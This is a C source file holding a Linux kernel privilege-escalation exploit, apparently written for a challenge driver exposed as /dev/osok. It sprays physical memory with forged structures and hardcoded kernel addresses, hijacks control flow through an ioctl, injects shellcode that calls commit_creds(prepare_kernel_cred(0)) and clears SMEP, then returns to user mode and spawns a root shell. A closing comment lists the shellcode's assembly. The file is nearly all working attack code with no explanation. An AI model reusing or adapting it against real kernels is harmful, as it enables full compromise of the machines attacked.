#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <pty.h>
#include <signal.h>

/* constants */
#define BASE10		10		/* base 10 */
#define BASE16		16		/* base 16 */
#define PATH_SZ		32		/* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK	(1ULL << 63) 	/* get bit 63 from a 64-bit integer */
#define PFN_MASK	((1ULL << 55) - 1)	/* get bits 0-54 from
						   a 64-bit integer */

struct control_flow_hijack_primitive{
	long long rax;
	long long rbx;
	long long rcx;
	long long rdx;
	long long rsi;
	long long rdi;
	long long rsp;
	long long rbp;
	long long r8;
	long long r9;
	long long r10;
	long long r11;
	long long r12;
	long long r13;
	long long r14;
	long long r15;
	long long rip;
	long long reset_all;
};


#define regcache_mark_dirty 0xffffffff81608250
#define mp_size			1024*64 //64K*2
#define spray_times		64*32	// heap spray size : 64K*64*32 = 128M*2
#define set_memory_x		0xffffffff81056ca0

//long long guess_physmap = 0xffff888007a72000;
long long guess_physmap = 0xffff888002396000;

void get_shell(void){
    system("/bin/sh");
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL= 0xffffffff81087130;
void (*commit_creds)(void*) KERNCALL=0xffffffff81086e20;
void payload(){
      commit_creds(prepare_kernel_cred(0));
}

void error_quit(char *arg)
{
	puts(arg);
	exit(-1);
}

static void
querypmap(unsigned long vaddr)
{
	/* path in /proc */
	char		path[PATH_SZ];
	/* pagemap entry */
	u_int64_t	pentry	= 0;

	/* pagemap file */
	FILE		*fp	= NULL;

	/* cleanup */
	(void)memset(path, 0, PATH_SZ);

	/* format the path variable */
	if (snprintf(path, PATH_SZ, "/proc/self/pagemap") > PATH_SZ)
		errx(4, "failed while trying to open /proc/%d/pagemap -- %s",path);

	/* open the pagemap file */
	if ((fp = fopen(path, "r")) == NULL)
		errx(4, "failed while trying to open %s -- %s", path,
				strerror(errno));

	/* seek to the appropriate place */
	if (fseek(fp, (vaddr / 4096) * sizeof(u_int64_t), SEEK_CUR) == -1)
		errx(5, "failed while trying to seek in pagemap -- %s",
				strerror(errno));

	/* read the corresponding pagemap entry */
	if (fread(&pentry, sizeof(u_int64_t), 1, fp) != 1) {
		if (ferror(fp))
			errx(6,
			"failed while trying to read a pagemap entry -- %s",
			strerror(errno));
		else
		errx(6,
		"unknown error while trying to read a pagemap entry -- %s",
			strerror(errno));
	}

	/* check the present bit */
	//printf("pentry:%llu\n",pentry);
	if ((pentry & PRESENT_MASK) == 0)
		warnx("%#lx is not present in physical memory", vaddr);
	else
		(void)fprintf(stdout,
				"PFN[%#lx]: %llu\n", vaddr, pentry & PFN_MASK);

	if(pentry)guess_physmap = pentry;
	/* cleanup */
	(void)fclose(fp);
}

void heap_spray()
{
	int i = 0,num;
	char *mp;
	char *p;
	for (i = 0; i < spray_times; i++)
	{
        	if ((p = mmap(NULL, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 )) == MAP_FAILED)
                	error_quit("mmap error");
		//querypmap(p);
		memset(p,'A',0x7);
		for (num = 0; num < 64; num++)
		{
			mp = p + num * 1024;
			*((unsigned long *)&mp[0x30]) = guess_physmap+0x40;
			*((unsigned long *)&mp[0x20]) = 0xffffffff8153588e;
			*((unsigned long *)&mp[0xe0]) = 0;
			*((unsigned long *)&mp[0x9e]) = 0xffffffff81608251;//regcache_mark_dirty+1
			*((unsigned long *)&mp[0x8]) =  guess_physmap+0x70;
			*((unsigned long *)&mp[0x70]) =  guess_physmap;
			*((unsigned long *)&mp[0x60]) =  set_memory_x;
			*((unsigned long *)&mp[0x68]) =  guess_physmap+0x100;
			*((unsigned long *)&mp[0x270]) =  0xffffffff810a9114;//0xffffffff81449d93 ? xor cl, ch; jmp qword ptr [rsi + 0x2e];
			memcpy(mp+0x100,"\x90\x90\x90\x90\x90\x90\x48\xc7\xc0\xb0\x73\x05\x81\x48\xc7\xc7\x00\x00\x00\xc0\x48\xc7\xc6\x01\x00\x00\x00\xff\xd0\x48\xc7\xc0\x80\x0a\x00\xc0\x48\xc7\x00\x00\x00\x00\x00\x48\xc7\xc0\xc0\x01\x00\xc0\x48\xbb\x48\xc7\xc7\x00\x00\x00\x00\x48\x48\x89\x18\x48\xc7\xc0\xc8\x01\x00\xc0\x48\xbb\xc7\xc0\x30\x71\x08\x81\xff\xd0\x48\x89\x18\x48\xc7\xc0\xd0\x01\x00\xc0\x48\xbb\x48\x89\xc7\x48\xc7\xc0\x20\x6e\x48\x89\x18\x48\xc7\xc0\xd8\x01\x00\xc0\x48\xbb\x08\x81\xff\xd0\x48\xc7\xc7\xf0\x48\x89\x18\x48\xc7\xc0\xe0\x01\x00\xc0\x48\xbb\x06\x00\x00\x48\xc7\xc2\x48\x00\x48\x89\x18\x48\xc7\xc0\xe8\x01\x00\xc0\x48\xbb\x00\x00\x48\xc7\xc0\x02\x0e\x05\x48\x89\x18\x48\xc7\xc0\xf0\x01\x00\xc0\x48\xbb\x81\xff\xd0\x0f\x01\xf8\x6a\x2b\x48\x89\x18\x48\xc7\xc0\xf8\x01\x00\xc0\x48\xbb\x68\x00\x10\x10\x00\x68\x46\x02\x48\x89\x18\x48\xc7\xc0\x00\x02\x00\xc0\x48\xbb\x00\x00\x6a\x33\x68\x4d\x0b\x40\x48\x89\x18\x48\xc7\xc0\x08\x02\x00\xc0\x48\xc7\xc3\x00\x48\xcf\x00\x48\x89\x18\x48\xbb\x00\x68\x9f\x0f\x80\x88\xff\xff\x49\xc7\xc4\x01\x00\x00\x00\x49\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc5\x0b\x00\x00\x00\x48\xbc\x20\x3f\x00\x00\x00\xc9\xff\xff\x49\xbd\x6c\x3f\x00\x00\x00\xc9\xff\xff\x4d\x31\xdb\x4d\x31\xf6\x4d\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x58\x48\xc7\xc0\x3b\x72\x0b\x81\x50\x48\xc7\xc0\x85\x00\x00\xc0\x50\x6a\x46\x9d\xfa\x48\x31\xc0\xc3",331);
		}
	}	
}

//0xffffffffc0000000
unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}
void getshell()
{
    system("/bin/sh");
}

int main(void){
    setbuf(stdout,0);
    save_stats();
    printf("%lx %lx %lx %lx\n",user_cs,user_eflags,user_sp,user_ss);
    char * pp = mmap(0x100000, 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,-1, 0);
	int fd = open("/dev/osok",O_RDWR);
	if(fd < 0 ){
		printf("Open /dev/osok error!\n");
		exit(0);
	}
	heap_spray();
	struct control_flow_hijack_primitive buf;
	buf.rip=regcache_mark_dirty;
	buf.rdi=guess_physmap;
	ioctl(fd,1337,&buf);
	sleep(4);
	int fp = open("/dev/osok",O_RDWR);
	if(fp < 0 ){
		printf("Open /dev/osok error!\n");
		exit(0);
	}
	ioctl(fp,1337,0);
	getshell();
	return 0;
    

}
/*
 # shellcode
mov rax,0xffffffff810573b0 set_memory_rw
mov rdi,0xffffffffc0000000
mov rsi,0x1
call rax
mov rax,0xffffffffc0000a80
mov qword ptr [rax],0
mov rax,0xffffffffc00001c0
mov rbx,0x4800000000c7c748
mov qword ptr [rax],rbx
mov rax,0xffffffffc00001c8
mov rbx,0xd0ff81087130c0c7
mov qword ptr [rax],rbx
mov rax,0xffffffffc00001d0
mov rbx,0x6e20c0c748c78948
mov qword ptr [rax],rbx
mov rax,0xffffffffc00001d8
mov rbx,0xf0c7c748d0ff8108
mov qword ptr [rax],rbx
mov rax,0xffffffffc00001e0
mov rbx,0x48c2c748000006
mov qword ptr [rax],rbx
mov rax,0xffffffffc00001e8
mov rbx,0x50e02c0c7480000
mov qword ptr [rax],rbx
mov rax,0xffffffffc00001f0
mov rbx,0x2b6af8010fd0ff81
mov qword ptr [rax],rbx
mov rax,0xffffffffc00001f8
mov rbx,0x246680010100068
mov qword ptr [rax],rbx
mov rax,0xffffffffc0000200
mov rbx,0x400b4d68336a0000
mov qword ptr [rax],rbx
mov rax,0xffffffffc0000208
mov rbx,0xcf4800
mov qword ptr [rax],rbx
mov rbx,0xffff88800f9f6800
mov r12,1
mov r15,1
mov rbp,0xb
mov rsp,0xffffc90000003f20
mov r13,0xffffc90000003f6c
xor r11,r11
xor r14,r14
xor r10,r10
xor r8,r8
xor r9,r9
pop rax
mov rax,0xffffffff810b723b
push rax
mov rax,0xffffffffc0000085
push rax
push 0x46
popfq
cli
xor rax,rax
ret
 
 
 
# patch handle_args
mov rdi,0
mov rax,0xffffffff81087130 //prepare_kernel_cred
call rax
mov rdi,rax
mov rax,0xffffffff81086e20 //commit_creds
call rax
mov rdi,0x6f0
mov rdx,0x48
# mov cr4, rdi; push rdx; popfq; ret;
mov rax,0xffffffff81050e02
call rax
 
push 0x2b
mov rax, 0x100000
push rax
push 0x246
push 0x33
push 0x000000000400B4D
swapgs
iretq
*/
